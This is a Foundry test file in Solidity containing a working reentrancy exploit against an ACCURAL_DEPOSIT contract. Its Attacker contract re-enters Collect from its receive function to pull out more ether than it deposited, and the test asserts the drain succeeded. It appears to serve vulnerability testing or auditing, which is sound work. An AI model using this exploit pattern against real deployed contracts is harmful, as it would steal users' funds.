
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/ACCURAL_DEPOSIT.sol";

contract TestReentrancyACCURAL_DEPOSIT is Test {
    ACCURAL_DEPOSIT public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ACCURAL_DEPOSIT();

        // Configure contract so we control the LogFile (not strictly necessary for the bug)
        _contractUnderTest.SetLogFile(address(new LogFile()));
        _contractUnderTest.Initialized();

        _attacker = new Attacker(address(_contractUnderTest));

        // Ensure the victim has some ether to drain
        vm.deal(address(_contractUnderTest), 100 ether);
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // Constrain fuzzed value
        vm.assume(attackVal >= 1 ether && attackVal <= 10 ether);

        // Fund the Attacker and this test contract for deposits
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        // Setup and perform the attack
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // Verify that the attacker gained more than they legitimately deposited
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ACCURAL_DEPOSIT public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        _victim = ACCURAL_DEPOSIT(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;

        // Deposit into victim so that Collect can be called
        _victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        // First Collect call triggers reentrancy
        _victim.Collect(val);

        // Check if more ether than deposited was pulled out
        if (address(this).balance > initialSnapshot + val / 10) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter Collect before balance is reduced in the victim
            _victim.Collect(storedAttackVal);
        }
    }
}
